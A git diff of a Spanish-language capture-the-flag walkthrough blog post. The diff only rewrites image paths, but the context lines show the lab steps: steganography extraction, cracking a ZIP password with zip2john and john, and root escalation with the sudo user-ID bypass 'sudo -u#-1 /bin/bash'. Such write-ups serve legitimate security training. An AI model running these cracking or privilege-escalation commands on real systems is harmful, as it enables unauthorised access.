@@ -143,7 +143,7 @@ Se analizan las imágenes usando diversas herramientas.
 strings cutie.png
 ```
 
-{{< figure src="/images/strings-img.png" >}}
+{{< figure src="/blog/images/strings-img.png" >}}
 
 Se observa el archivo `To_agentR.txt` incrustado.
 
@@ -154,11 +154,11 @@ Se observa el archivo `To_agentR.txt` incrustado.
 binwalk -e cutie.png
 ```
 
-{{< figure src="/images/binaries-in-img.png" >}}
+{{< figure src="/blog/images/binaries-in-img.png" >}}
 
 La extracción genera varios archivos, destacando un ZIP cifrado.
 
-{{< figure src="/images/content-of-cutieimg.png" >}}
+{{< figure src="/blog/images/content-of-cutieimg.png" >}}
 
 ```bash
 file 8702.zip
@@ -176,9 +176,9 @@ zip2john 8702.zip > hash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-{{< figure src="/images/zip2john.png" >}}
+{{< figure src="/blog/images/zip2john.png" >}}
 
-{{< figure src="/images/john-in-action.png" >}}
+{{< figure src="/blog/images/john-in-action.png" >}}
 
 La passphrase obtenida es:
 
@@ -187,7 +187,7 @@ La passphrase obtenida es:
 
 ## Fase 7: Decodificación y Nuevas Credenciales {#fase-7-decodificación-y-nuevas-credenciales}
 
-{{< figure src="/images/to-agent-r-zip.png" >}}
+{{< figure src="/blog/images/to-agent-r-zip.png" >}}
 
 ```bash
 echo QXJlYTUx | base64 -d
@@ -199,21 +199,21 @@ Resultado:
 
 Esta contraseña se utiliza con **steghide** sobre la imagen restante, obteniendo credenciales para el usuario **james**.
 
-{{< figure src="/images/agent-james.png" >}}
+{{< figure src="/blog/images/agent-james.png" >}}
 
 
 ## Fase 8: Acceso como James {#fase-8-acceso-como-james}
 
-{{< figure src="/images/enum-james.png" >}}
+{{< figure src="/blog/images/enum-james.png" >}}
 
 Se obtiene la primera flag `user.txt`.
 
 
 ## Fase 9: Investigación de la Imagen Alien {#fase-9-investigación-de-la-imagen-alien}
 
-{{< figure src="/images/rsync-to-alien.png" >}}
+{{< figure src="/blog/images/rsync-to-alien.png" >}}
 
-{{< figure src="/images/google-image-search.png" >}}
+{{< figure src="/blog/images/google-image-search.png" >}}
 
 
 ## Fase 10: Escalada de Privilegios {#fase-10-escalada-de-privilegios}
@@ -222,12 +222,12 @@ Se obtiene la primera flag `user.txt`.
 sudo -l
 ```
 
-{{< figure src="/images/sudo-dash-l.png" >}}
+{{< figure src="/blog/images/sudo-dash-l.png" >}}
 
-{{< figure src="/images/meme.jpg" >}}
+{{< figure src="/blog/images/meme.jpg" >}}
 
 ```bash
 sudo -u#-1 /bin/bash
 ```
 
-{{< figure src="/images/ending.png" >}}
+{{< figure src="/blog/images/ending.png" >}}
